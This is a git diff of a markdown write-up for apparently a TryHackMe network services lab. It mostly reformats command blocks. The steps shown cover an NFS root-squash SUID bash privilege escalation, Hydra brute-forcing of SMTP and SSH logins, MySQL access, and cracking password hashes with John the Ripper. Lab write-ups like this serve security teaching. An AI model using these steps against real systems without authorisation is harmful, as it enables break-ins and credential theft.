@@ -103,12 +103,16 @@ NFS often enables root squashing by default, which maps root user requests to a 
 
 #### Exploitation Steps
 1.  **Copy a Malicious Binary**: Copy a bash binary to the NFS share and set its owner to root.
-  > sudo cp /bin/bash /tmp/mount/
-  > sudo chown root:root /tmp/mount/bash
+   
+``sudo cp /bin/bash /tmp/mount/
+
+sudo chown root:root /tmp/mount/bash``
 2. **Set the SUID Bit**: Add SUID permission to the binary.
-  > sudo chmod +s /tmp/mount/bash
+
+``sudo chmod +s /tmp/mount/bash``
 3. **Execute as Root**: Run the binary with elevated privileges.
-  > ./bash -p
+  
+``./bash -p``
 
 
 
@@ -187,7 +191,7 @@ SMTP operates like a digital postal service, delivering emails through a structu
 3. **Domain Check**: The SMTP server verifies whether the sender’s and recipient’s domains match.
 4. **Relaying**: The server connects to the recipient’s SMTP server to transfer the email. If unavailable, the message enters an SMTP queue.
 5. **Verification**: The recipient’s SMTP server confirms the domain and username.
-6.** Delivery**: The email is passed to the recipient’s POP/IMAP server, where it appears in the inbox.
+6. **Delivery**: The email is passed to the recipient’s POP/IMAP server, where it appears in the inbox.
 
 **_THM Section Answers_**
 
@@ -216,9 +220,11 @@ SMTP (Simple Mail Transfer Protocol) is primarily used for email transmission. I
 
 ##### Steps for Exploitation
 1. **Enumerate Users**: Use tools like Hydra to brute-force user credentials.
-> hydra -t 16 -l <username> -P <wordlist> <IP> smtp
+
+``hydra -t 16 -l <username> -P <wordlist> <IP> smtp``
 2. **Brute-Force SSH**: Use retrieved credentials to brute-force SSH access.
-> hydra -t 16 -l <username> -P <wordlist> <IP> ssh
+
+`` hydra -t 16 -l <username> -P <wordlist> <IP> ssh``
 
 **_THM Section Answers_**
 
@@ -274,13 +280,15 @@ MySQL is typically not the primary focus during initial enumeration of a server.
 
 **Requirements for MySQL Enumeration**
 efore interacting with MySQL, ensure the MySQL client is installed on your system. You can install it with the following command:
->> sudo apt install default-mysql-client
+
+``sudo apt install default-mysql-client``
 
 This tool enables you to connect to the MySQL database server and execute SQL commands for enumeration and exploitation.
 
 **Steps of Enumeration**
 1.  **Identify Running Port**: Use nmap to locate the MySQL service.
->>  nmap -p 3306 <target-IP>
+
+``nmap -p 3306 <target-IP>``
       
 **_THM Section Answers_**
 
@@ -318,12 +326,14 @@ Before further exploiting the MySQL database, here’s what we know:
 
 **Steps for Exploitation**
 1. **Login to MySQL**: Use credentials obtained from enumeration.
- >> mysql -u root -p -h <target-IP>
+
+``mysql -u root -p -h <target-IP>``
 2. **Dump Schemas and Hashes**:Extract database schemas and password hashes for further analysis.
 
 Hash Cracking
 Use John the Ripper to crack MySQL password hashes:
->> john hash.txt
+
+``john hash.txt``
 
 **_THM Section Answers_**
 
